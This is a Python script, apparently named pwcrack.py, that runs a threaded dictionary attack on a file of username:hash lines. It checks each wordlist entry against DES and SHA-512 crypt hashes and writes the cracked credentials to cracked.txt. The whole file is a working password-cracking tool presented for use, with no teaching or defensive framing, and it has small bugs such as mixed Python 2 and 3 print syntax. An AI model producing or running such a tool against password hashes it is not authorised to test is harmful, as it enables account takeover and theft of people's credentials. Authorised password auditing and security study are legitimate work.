import crypt
import sys
import time
import optparse
from threading import Thread


class bcolours:
    GREEN = '\033[92m'
    TURQ = '\033[96m'
    ENDC = '\033[0m'

def testPass(user, cryptPass, wname):
    salt = cryptPass[0:2]
    if not salt in ('HX','$6','$s'):
         print ('[*] Sorry, hash not recognised, moving onto next hash')
         return
    shasalt = cryptPass[3:11].strip()
    insalt = '$6$' + shasalt
    dictFile = open(wname,'r')
    dictLen = 0
    for line in dictFile.readlines():
        dictLen += 1
    fileLen = dictLen
    dictFile = open(wname,'r')
    currLine = 0
    for word in dictFile.readlines():
        currLine += 1
        word = word.strip('\n')
        cryptWord = crypt.crypt(word,salt)
        cryptSHA = crypt.crypt(word, insalt)
        if (cryptWord == cryptPass or cryptSHA.rstrip() == cryptPass.rstrip()):
            print (bcolours.GREEN + '\n' + '[+] ' + bcolours.ENDC + 'Successful Brute Force: ' + user + ':' + word + "\n")
            with open('cracked.txt', 'a') as file:
                print >> file, (user + ':' + word)
            time.sleep(2)
            break
        if (cryptWord != cryptPass or cryptSHA != cryptPass):
            print ('[-] Trying: ' + word  + " " + str(currLine) + "/" + str(fileLen))
            continue
    return

def main():
    parser = optparse.OptionParser('usage: pwcrack.py ' + '-f <file with hash> -w <wordlist>')
    parser.add_option('-f', dest='fname',type='string',help='specify a file with hashes inside')
    parser.add_option('-w', dest='wname',type='string',help='specify a wordlist for dictionary attack')
    (options,args) = parser.parse_args()
    if (options.fname == None) | (options.wname == None):
        print parser.usage
        exit(0)
    else:
        fname = options.fname
        wname = options.wname
    count = 0
    passFile = open(fname,'r')
    for line in passFile.readlines():
        if ":" in line:
            user = line.split(":")[0]
            cryptPass = line.split(":")[1].strip(' ')
            print ('\n' + '[*] Cracking Password for username: ' + user + '\n')
            time.sleep(2)
            t = Thread(target=testPass, args=(user, cryptPass, wname))
            t.start()

if __name__ == "__main__":
    main()
